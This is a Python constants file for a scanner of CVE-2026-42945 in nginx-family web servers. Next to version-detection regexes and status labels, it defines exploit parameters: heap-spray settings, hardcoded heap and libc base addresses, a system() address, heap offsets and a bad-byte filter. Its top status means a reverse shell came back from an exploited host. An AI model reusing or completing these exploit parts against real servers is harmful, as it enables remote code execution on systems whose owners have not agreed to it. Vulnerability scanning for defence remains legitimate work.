"""Shared constants for CVE-2026-42945 scanning."""

from __future__ import annotations

import re

CVE_ID = "CVE-2026-42945"
DEFAULT_PORTS = (80, 443, 19321)
MAX_RESPONSE_BYTES = 64 * 1024

AFFECTED_FLOOR = (0, 6, 27)
PATCHED_1_30 = (1, 30, 1)
PATCHED_1_31 = (1, 31, 0)

SERVER_PRODUCT_RE = re.compile(
    r"(?P<product>nginx|openresty|tengine|OpenResty|Tengine)"
    r"(?:/|\s)(?P<version>\d+\.\d+(?:\.\d+)?)",
    re.IGNORECASE,
)

NON_NGINX_SERVER_RE = re.compile(
    r"(apache|microsoft-iis|lighttpd|caddy|cloudflare|gunicorn|uvicorn|"
    r"jetty|tomcat|awselb|amazons3|keycdn|envoy|traefik|vercel)",
    re.IGNORECASE,
)

EXPLOIT_BODY_LEN = 4000
EXPLOIT_N_SPRAY = 20
EXPLOIT_HEAP_BASE = 0x555555659000
EXPLOIT_LIBC_BASE = 0x7FFFF77BA000
EXPLOIT_SYSTEM_ADDR = EXPLOIT_LIBC_BASE + 0x50D70
EXPLOIT_PREREAD_HEAP_OFFSETS = [
    0x05A427, 0x060E67,
    0x0BA557, 0x0BF367, 0x0C4177, 0x0C8F87, 0x0CDD97,
    0x0D2BA7, 0x0D79B7, 0x0DC7C7, 0x0E15D7, 0x0E63E7,
    0x0EB1F7, 0x0F0007, 0x0F4E17, 0x0F9C27, 0x0FEA37,
    0x103847, 0x108657, 0x10D467,
]

EXPLOIT_SAFE: set[int] = set()
_bitmask = [
    0xFFFFFFFF, 0xD800086D, 0x50000000, 0xB8000001,
    0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF,
]
for _byte in range(256):
    if not (_bitmask[_byte >> 5] & (1 << (_byte & 0x1F))):
        EXPLOIT_SAFE.add(_byte)

STATUS_MARKS = {
    "confirmed_vulnerable": "[SHELL]",
    "likely_vulnerable": "[!!!]",
    "vulnerable_version": "[!!]",
    "possibly_vulnerable": "[?]",
    "not_vulnerable": "[ ]",
    "down": "[-]",
    "error": "[x]",
}

CLASSIFICATION_NOTES = {
    "down": "No HTTP service",
    "not_vulnerable": "Patched nginx or non-nginx",
    "vulnerable_version": "Nginx in CVE range; rewrite+set+? not confirmed remotely",
    "possibly_vulnerable": (
        "Affected version with weak config signal, or unknown nginx/version"
    ),
    "likely_vulnerable": (
        "Affected version plus strong config signal (redirect/query or + expansion)"
    ),
    "confirmed_vulnerable": (
        "Reverse shell callback received after poc.py-style exploit"
    ),
}
